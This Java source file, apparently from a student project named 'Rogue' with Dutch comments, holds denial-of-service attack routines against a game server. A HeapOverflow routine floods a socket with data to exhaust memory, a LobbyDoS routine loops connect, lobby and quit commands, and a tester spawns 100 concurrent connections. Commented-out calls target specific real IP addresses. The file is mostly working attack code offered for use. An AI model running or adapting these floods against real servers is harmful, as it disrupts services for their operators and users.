package Rogue;

public class Main {
	
	//Sockets in java blocken standaard. Hierdoor is de HeapOverflow aanval vrij langzaam in java.
	//In python of een willekeurige andere taal is het makkelijker om veel data te versturen.
	public static void HeapOverflow(String host, int port) {
		BufferFiller filler = new BufferFiller(host, port);
		filler.start();
		long old;
		while (true) {
			old = filler.getDataSent();
			try {
				Thread.sleep(1500);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			System.out.println(filler.getDataSent()/1000000 + "MB = " + filler.getMbips() + "Mbips");
		}
	}
	
	public static void LobbyDoS(String host, int port) {
		LobbyDoS exploit = new LobbyDoS(host, port);
		System.out.println("Starting lobby DoS!");
		exploit.start();
		Connection con = new Connection(host, port, false);
		while(true) {
			con.sendLine("CONNECT 12345678903141");
			con.sendLine("LOBBY");
			con.sendLine("QUIT");
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			con.disconnect();
		}
	}
	
	public static void testInput(String host, int port) {
		for (int i = 0; i != 100; ++i) {
			InputTester test = new InputTester(host, port);
			test.start();
		}
	}
	
	public static void main(String[] args) {
		testInput("127.0.0.1", 8888);
		//HeapOverflow("130.89.140.216", 1234);
		//LobbyDoS("130.89.137.202", 1234);
	}
}
